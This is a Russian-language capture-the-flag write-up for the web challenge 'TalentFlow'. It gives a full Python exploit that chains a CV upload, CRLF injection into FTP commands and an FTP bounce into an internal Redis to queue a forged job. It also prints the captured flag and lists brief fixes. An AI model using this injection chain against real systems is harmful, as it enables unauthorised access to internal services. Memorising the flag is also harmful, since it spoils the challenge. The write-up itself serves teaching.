# Web Challenge 3: TalentFlow

## Идея
Цепочка: загрузка файла → инъекция FTP-команд → bounce в Redis → воркер генерирует PDF с флагом.

## Шаги решения
1. Загружаем валидный `.docx`, получаем `DOC_UUID`.
2. Генерируем `.resp` с `RPUSH jobs` и своим `marker UUID`.
3. Через CRLF-инъекцию в FTP-команды делаем `EPRT` на Redis и `RETR` подготовленного `.resp`.
4. Ждём, пока воркер обработает job.
5. Скачиваем `/cv/<marker>.pdf` и вытаскиваем `LB{...}`.

## Команды для выполнения (без готовых скриптов)

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install requests
```

Создай `exploit_chall3.py`:

```python
import io, json, re, socket, time, zipfile, requests

BASE = "http://158.160.221.45:7423"
REDIS_IP = "172.18.0.4"
MARKER = "11111111-1111-1111-1111-111111111111"
PDF_RE = re.compile(r"/cv/([0-9a-f-]+)\.pdf")
FLAG_RE = re.compile(rb"LB\{[^}\s]+\}")


def make_docx(text):
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", """<?xml version='1.0'?>
<Types xmlns='http://schemas.openxmlformats.org/package/2006/content-types'>
<Default Extension='rels' ContentType='application/vnd.openxmlformats-package.relationships+xml'/>
<Default Extension='xml' ContentType='application/xml'/>
<Override PartName='/word/document.xml' ContentType='application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml'/>
</Types>""")
        z.writestr("_rels/.rels", """<?xml version='1.0'?>
<Relationships xmlns='http://schemas.openxmlformats.org/package/2006/relationships'>
<Relationship Id='rId1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument' Target='word/document.xml'/>
</Relationships>""")
        z.writestr("word/document.xml", f"""<?xml version='1.0'?>
<w:document xmlns:w='http://schemas.openxmlformats.org/wordprocessingml/2006/main'><w:body><w:p><w:r><w:t>{text}</w:t></w:r></w:p></w:body></w:document>""")
    return out.getvalue()


def submit(sess, name, content, ctype):
    r = sess.post(BASE + "/apply", data={"full_name":"solver","email":"a@a","phone":"1","position":"x"},
                  files={"cv":(name, content, ctype)}, timeout=30)
    r.raise_for_status()
    m = PDF_RE.search(r.text)
    if not m: raise RuntimeError("uuid not found")
    return m.group(1)


def raw_get(path):
    req = f"GET {path} HTTP/1.1\r\nHost: 158.160.221.45:7423\r\nConnection: close\r\n\r\n".encode()
    s = socket.create_connection(("158.160.221.45", 7423), timeout=20)
    s.sendall(req)
    while s.recv(4096):
        pass
    s.close()


sess = requests.Session()
doc_uuid = submit(sess, "stage1.docx", make_docx("admin cv"), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")
print("DOC_UUID", doc_uuid)

job = json.dumps({"user_id":1,"filename":f"{doc_uuid}.docx","cv_uuid":MARKER}, separators=(",",":"))
resp = f"*3\r\n$5\r\nRPUSH\r\n$4\r\njobs\r\n${len(job)}\r\n{job}\r\n".encode()
resp_uuid = submit(sess, "job.resp", resp, "application/octet-stream")
print("RESP_UUID", resp_uuid)

inj = f"/cv/{resp_uuid}.resp%0d%0aEPRT%20|1|{REDIS_IP}|6379|%0d%0aRETR%20{resp_uuid}.resp"
raw_get(inj)

pdf_url = f"{BASE}/cv/{MARKER}.pdf"
for _ in range(30):
    r = sess.get(pdf_url, timeout=15)
    if r.status_code == 200:
        m = FLAG_RE.search(r.content)
        print(m.group(0).decode() if m else "pdf ok, flag parse failed")
        break
    time.sleep(1)
else:
    print("timeout")
```

Запуск:

```bash
python3 exploit_chall3.py
```

## Флаг
```text
LB{78844f003b0dbe51b67791cc295bc815}
```

## Фикс
- Жёсткая фильтрация/нормализация FTP-команд и имён файлов.
- Блокировка CRLF-инъекции.
- Сетевое разделение: воркер не должен ходить в Redis напрямую таким путём.
